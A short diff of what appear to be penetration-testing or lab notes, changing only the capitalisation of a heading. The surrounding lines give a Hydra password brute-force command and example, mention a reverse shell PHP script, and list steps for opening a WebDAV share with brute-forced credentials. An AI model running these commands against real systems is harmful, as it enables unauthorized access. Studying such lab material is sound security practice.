@@ -40,7 +40,7 @@ Commands:
    - Hydra: hydra -l $USERNAME -P /path/to/wordlist -s $TARGET_PORT -f -vV $TARGET_URL
    - Example: hydra -l admin -P /usr/opt/wordlist.txt -s 80 -f -vV victim.com/vulnerable_folder
 
-Reverse shell.php script
+Reverse shell.php Script
 - Open Folder and Click “Other Locations”
 Command: “dav://172.16.84.205/webdav/”
 - Use Ryan’s login credentials (brute force with Hydra)
